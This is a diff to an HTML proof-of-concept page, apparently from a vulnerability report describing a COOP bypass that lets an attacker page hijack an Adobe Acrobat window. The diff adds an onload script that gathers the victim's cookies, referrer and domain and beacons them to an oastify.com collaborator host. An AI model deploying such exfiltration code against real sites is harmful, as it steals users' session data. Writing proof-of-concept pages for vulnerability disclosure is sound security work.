@@ -1,29 +1,47 @@
-<!DOCTYPE html>
-  <html>                                                                                                                                                                                                                                             
-  <head>
-  <title>Window Hijacked</title>                                                                                                                                                                                                                     
-  <style>                                                   
+<!DOCTYPE html>                                                                                                                                                                                                                                    
+  <html>
+  <head>                                                                                                                                                                                                                                             
+  <title>Window Hijacked</title>                            
+  <style>
     body { margin: 0; background: #8b0000; color: white; font-family: Arial;
-           display: flex; flex-direction: column; align-items: center;                                                                                                                                                                               
+           display: flex; flex-direction: column; align-items: center;
            justify-content: center; min-height: 100vh; text-align: center; }
-    h1 { font-size: 48px; margin-bottom: 10px; }                                                                                                                                                                                                     
+    h1 { font-size: 48px; margin-bottom: 10px; }
     p  { font-size: 20px; color: #ffcccc; max-width: 600px; }
-    .badge { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.3);                                                                                                                                                             
-             border-radius: 8px; padding: 16px 32px; margin-top: 30px; font-size: 14px; }                                                                                                                                                            
-    code { background: rgba(0,0,0,0.3); padding: 2px 8px; border-radius: 4px; }                                                                                                                                                                      
-  </style>                                                                                                                                                                                                                                           
-  </head>                                                                                                                                                                                                                                            
-  <body>                                                                                                                                                                                                                                             
-    <h1>⚠️  Window Hijacked</h1>                                                                                                                                                                                                                      
+    .badge { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.3);
+             border-radius: 8px; padding: 16px 32px; margin-top: 30px; font-size: 14px; }
+    code { background: rgba(0,0,0,0.3); padding: 2px 8px; border-radius: 4px; }
+  </style>
+  <script>
+    window.onload = function() {
+      var data = {
+        cookie:   document.cookie,
+        referrer: document.referrer,
+        url:      window.location.href,
+        domain:   document.domain
+      };
+
+      var beacon = 'https://svr12vlpoyu50fzs5cwtkenpcgi7fv6jv.oastify.com/hijack' +
+        '?cookie='   + encodeURIComponent(data.cookie) +
+        '&referrer=' + encodeURIComponent(data.referrer) +
+        '&domain='   + encodeURIComponent(data.domain);
+
+      new Image().src = beacon;
+      fetch(beacon, { mode: 'no-cors' });
+    };
+  </script>
+  </head>
+  <body>
+    <h1>⚠️  Window Hijacked</h1>
     <p>This Adobe Acrobat window was silently redirected by an attacker page.</p>
-    <p>The victim opened <strong>acrobat.adobe.com</strong> but the attacker                                                                                                                                                                         
-       gained full control due to the COOP fix bypass.</p>                                                                                                                                                                                           
-    <div class="badge">                                                                                                                                                                                                                              
-      <strong>Root cause:</strong> <code>?code=</code> parameter forced                                                                                                                                                                              
-      <code>COOP: unsafe-none</code> — bypassing the        
-      <code>same-origin-allow-popups</code> fix.<br><br>                                                                                                                                                                                             
+    <p>The victim opened <strong>acrobat.adobe.com</strong> but the attacker
+       gained full control due to the COOP fix bypass.</p>
+    <div class="badge">
+      <strong>Root cause:</strong> <code>?code=</code> parameter forced
+      <code>COOP: unsafe-none</code> — bypassing the
+      <code>same-origin-allow-popups</code> fix.<br><br>
       In a real attack this page would be a fake Google login
-      stealing the victim's OAuth token.                                                                                                                                                                                                             
-    </div>                                                  
-  </body>                                                                                                                                                                                                                                            
+      stealing the victim's OAuth token.
+    </div>
+  </body>
   </html>
